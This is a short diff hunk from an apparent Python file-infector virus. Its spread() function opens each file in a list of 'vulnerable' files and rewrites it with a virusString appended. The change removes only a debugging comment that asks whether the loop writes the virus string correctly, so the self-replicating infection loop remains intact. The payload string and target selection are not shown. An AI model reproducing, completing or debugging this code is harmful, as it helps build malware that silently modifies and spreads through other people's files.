@@ -29,7 +29,7 @@ def spread(vulnerablefiles):
         temp = file.read()
         file.close()
         file = open(filename, "w")  # opens the file for writing
-        file.write(temp + virusString)  # writes the line of code to the file           ERROR IS HERE you are rewriting virusSting several times because it's in a for loop, but if you get rid of the loop then will it still work or not write to all the files?
+        file.write(temp + virusString)  # writes the line of code to the file           
         file.close()  # closes the file
         vulnerablefiles.remove(filename)
     virus.close()
